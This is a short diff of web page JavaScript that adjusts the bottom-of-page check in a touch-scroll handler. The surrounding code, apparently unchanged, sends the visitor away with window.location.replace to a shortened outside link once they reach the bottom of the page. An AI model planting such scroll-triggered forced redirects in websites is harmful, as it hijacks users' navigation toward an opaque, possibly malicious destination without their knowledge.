@@ -5,6 +5,6 @@ document.onscroll = function()
 };
 document.ontouchmove = function() 
 {
-    if (document.documentElement.scrollHeight == document.documentElement.scrollTop + document.documentElement.clientHeight)
+    if (document.documentElement.scrollHeight == document.documentElement.scrollTop + window.innerHeight)
         window.location.replace("https://cntr.click/DTaw1n5");
 };
